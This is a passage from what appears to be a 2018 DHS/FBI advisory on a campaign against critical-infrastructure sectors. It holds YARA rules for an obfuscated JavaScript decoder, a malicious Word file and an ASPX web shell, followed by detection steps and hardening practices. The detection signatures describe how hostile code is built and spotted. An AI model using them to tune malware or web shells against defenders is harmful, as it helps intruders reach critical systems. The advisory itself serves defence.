3C 3C 32 7C ?? 3E 3E 34 2C ?? 3D 28 ?? 26 31 35 29 3C 3C 34 7C ?? 3E 3E 32 2C ?? 3D 28 ?? 26 33 29 3C 3C 36 7C ?? 2C ?? 2B 3D [1-2] 53 74 72 69 6E 67 2E 66\n72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29 2C 36 34 21 3D ?? 26 26 28 ?? 2B 3D 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29}\n      $decode4 = {73 75 62 73 74 72 69 6E 67 28 34 2C ?? 2E 6C 65 6E 67 74 68 29}\n      $func_call=\"a(\\\"\"\n \ncondition:\n      filesize < 20KB and #func_call > 20 and all of ($decode*)\n \n}\n \n \n \nrule Query_XML_Code_MAL_DOC\n{\nmeta:\n      name= \"Query_XML_Code_MAL_DOC\"\n      author = \"other\"\n \nstrings:\n      $zip_magic = { 50 4b 03 04 }\n      $dir = \"word/_rels/\" ascii\n      $dir2 = \"word/theme/theme1.xml\" ascii\n      $style = \"word/styles.xml\" ascii\n \ncondition:\n      $zip_magic at 0 and $dir at 0x0145 and $dir2 at 0x02b7 and $style at 0x08fd\n}\n \n \n \nrule z_webshell\n{\nmeta:\n            description = \"Detection for the z_webshell\"\n            author = \"DHS NCCIC Hunt and Incident Response Team\"\n            date = \"2018/01/25\"\n            md5 =  \"2C9095C965A55EFC46E16B86F9B7D6C6\"\n \nstrings:\n            $aspx_identifier1 = \"<%@ \" nocase ascii wide\n            $aspx_identifier2 = \"<asp:\" nocase ascii wide\n            $script_import = /(import|assembly) Name(space)?\\=\\\"(System|Microsoft)/ nocase ascii wide\n            $case_string = /case \\\"z_(dir|file|FM|sql)_/ nocase ascii wide\n            $webshell_name = \"public string z_progname =\" nocase ascii wide\n            $webshell_password = \"public string Password =\" nocase ascii wide\n \ncondition:\n            1 of ($aspx_identifier*)\n            and #script_import > 10\n            and #case_string > 7\n            and 2 of ($webshell_*)\n            and filesize < 100KB\n}\nImpact\nThis actors’ campaign has affected multiple organizations in the energy, nuclear, water, aviation, construction, and critical manufacturing sectors.\nSolution\nDHS and FBI encourage network users and administrators to use the following detection and prevention guidelines to help defend against this activity.\n \nNetwork and Host-based Signatures\nDHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, and YARA and Snort signatures provided and add the IPs to\ntheir watch list to determine whether malicious activity is occurring within their organization. Reviewing network perimeter netflow will help determine whether a network\nhas experienced suspicious activity. Network defenders and malware analysts should use the YARA and Snort signatures provided in the associated YARA and .txt file to\nidentify malicious activity.\n \nDetections and Prevention Measures\nUsers and administrators may detect spear phishing, watering hole, web shell, and remote access activity by comparing all IP addresses and domain names listed in the\nIOC packages to the following locations:\nnetwork intrusion detection system/network intrusion protection system logs,\nweb content logs,\nproxy server logs,\ndomain name server resolution logs,\npacket capture (PCAP) repositories,\nfirewall logs,\nworkstation Internet browsing history logs,\nhost-based intrusion detection system /host-based intrusion prevention system (HIPS) logs,\ndata loss prevention logs,\nexchange server logs,\nuser mailboxes,\nmail filter logs,\nmail content logs,\nAV mail logs,\nOWA logs,\nBlackberry Enterprise Server logs, and\nMobile Device Management logs.\nTo detect the presence of web shells on external-facing servers, compare IP addresses, filenames, and file hashes listed in the IOC packages with the following\nlocations:\napplication logs,\nIIS/Apache logs,\nfile system,\nintrusion detection system/ intrusion prevention system logs,\nPCAP repositories,\nfirewall logs, and\nreverse proxy.\nDetect spear-phishing by searching workstation file systems and network-based user directories, for attachment filenames and hashes found in the IOC packages.\nDetect persistence in VDI environments by searching file shares containing user profiles for all .lnk files.\nDetect evasion techniques by the actors by identifying deleted logs. This can be done by reviewing last-seen entries and by searching for event 104 on Windows system\nlogs.\nDetect persistence by reviewing all administrator accounts on systems to identify unauthorized accounts, especially those created recently.\nDetect the malicious use of legitimate credentials by reviewing the access times of remotely accessible systems for all users. Any unusual login times should be\nreviewed by the account owners.\nDetect the malicious use of legitimate credentials by validating all remote desktop and VPN sessions of any user’s credentials suspected to be compromised.\nDetect spear-phishing by searching OWA logs for all IP addresses listed in the IOC packages.\nDetect spear-phishing through a network by validating all new email accounts created on mail servers, especially those with external user access.\nDetect persistence on servers by searching system logs for all filenames listed in the IOC packages.\nDetect lateral movement and privilege escalation by searching PowerShell logs for all filenames ending in “.ps1” contained in the IOC packages. (Note: requires\nPowerShell version 5, and PowerShell logging must be enabled prior to the activity.)\nDetect persistence by reviewing all installed applications on critical systems for unauthorized applications, specifically note FortiClient VPN and Python 2.7.\nDetect persistence by searching for the value of “REG_DWORD 100” at registry location “HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal”.\nServices\\MaxInstanceCount” and the value of “REG_DWORD 1” at location\n“HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\\dontdisplaylastusername”.\nDetect installation by searching all proxy logs for downloads from URIs without domain names.\n \nGeneral Best Practices Applicable to this Campaign:\nPrevent external communication of all versions of SMB and related protocols at the network boundary by blocking TCP ports 139 and 445 with related UDP port 137.\nSee the NCCIC/US-CERT publication on SMB Security Best Practices for more information.\nBlock the Web-based Distributed Authoring and Versioning (WebDAV) protocol on border gateway devices on the network.\nMonitor VPN logs for abnormal activity (e.g., off-hour logins, unauthorized IP address logins, and multiple concurrent logins).\nDeploy web and email filters on the network. Configure these devices to scan for known bad domain names, sources, and addresses; block these before receiving and\ndownloading messages. This action will help to reduce the attack surface at the network’s first level of defense. Scan all emails, attachments, and downloads (both on\nthe host and at the mail gateway) with a reputable anti-virus solution that includes cloud reputation services.\nSegment any critical networks or control systems from business systems and networks according to industry best practices.\nEnsure adequate logging and visibility on ingress and egress points.\nEnsure the use of PowerShell version 5, with enhanced logging enabled. Older versions of PowerShell do not provide adequate logging of the PowerShell commands\nan attacker may have executed. Enable PowerShell module logging, script block logging, and transcription. Send the associated logs to a centralized log repository for\nmonitoring and analysis. See the FireEye blog post Greater Visibility through PowerShell Logging for more information.\nImplement the prevention, detection, and mitigation strategies outlined in the NCCIC/US-CERT Alert TA15-314A – Compromised Web Servers and Web Shells – Threat\nAwareness and Guidance .\nEstablish a training mechanism to inform end users on proper email and web usage, highlighting current information and analysis, and including common indicators\nof phishing. End users should have clear instructions on how to report unusual or suspicious emails.\nImplement application directory whitelisting. System administrators may implement application or application directory whitelisting through Microsoft Software\nRestriction Policy, AppLocker, or similar software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software\nfolders. All other locations should be disallowed unless an exception is granted.\nBlock RDP connections originating from untrusted external addresses unless an exception exists; routinely review exceptions on a regular basis for validity.\nStore system logs of mission critical systems for at least one year within a security information event management tool.\nEnsure applications are configured to log the proper level of detail for an incident response investigation.\nConsider implementing HIPS or other controls to prevent unauthorized code execution.\nEstablish least-privilege controls.\nReduce the number of Active Directory domain and enterprise administrator accounts.\nBased on the suspected level of compromise, reset all user, administrator, and service account credentials across all local and domain systems.\nEstablish a password policy to require complex passwords for all users.\nEnsure that accounts for network administration do not have external connectivity.\nEnsure that network administrators use non-privileged accounts for email and Internet access.\nUse two-factor authentication for all authentication, with special emphasis on any external-facing interfaces and high-risk environments (e.g., remote access,\nprivileged access, and access to sensitive data).\nImplement a process for logging and auditing activities conducted by privileged accounts.\nEnable logging and alerting on privilege escalations and role changes.\nPeriodically conduct searches of publically available information to ensure no sensitive information has been disclosed. Review photographs and documents for\nsensitive data that may have inadvertently been included.\nAssign sufficient personnel to review logs, including records of alerts.\nComplete independent security (as opposed to compliance) risk review.\nCreate and participate in information sharing programs.\nCreate and maintain network and system documentation to aid in timely incident response. Documentation should include network diagrams, asset owners, type of\nasset, and an incident response plan.\n \nReport Notice\nDHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to DHS or law enforcement immediately. To\nrequest incident response resources or technical assistance, contact NCCIC at NCCICcustomerservice@hq.dhs.gov  or 888-282-0870 and the FBI through a local field\noffice or the FBI’s Cyber Division ( CyWatch@fbi.gov or 855-292-3937).\nReferences\n[1] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack…\n[2] CERT CC. Vulnerability Note #672268\n[3] CCIRC CF17-010 UPDATE\n[4] MIFR-10127623\nRevisions\nMarch 15, 2018: Initial Version\nThis product is provided subject to this Notification  and this Privacy & Use  policy.\nWas this document helpful?  Yes  |  Somewhat   |  No\nContact Us\n(888)282-0870\nSend us email\nDownload PGP/GPG keys\nSubmit website feedbackSubscribe to Alerts\nReceive security alerts, tips, and other updates.\n Enter your email address\nSign Up  \n HSINReport\nSearch\n "
}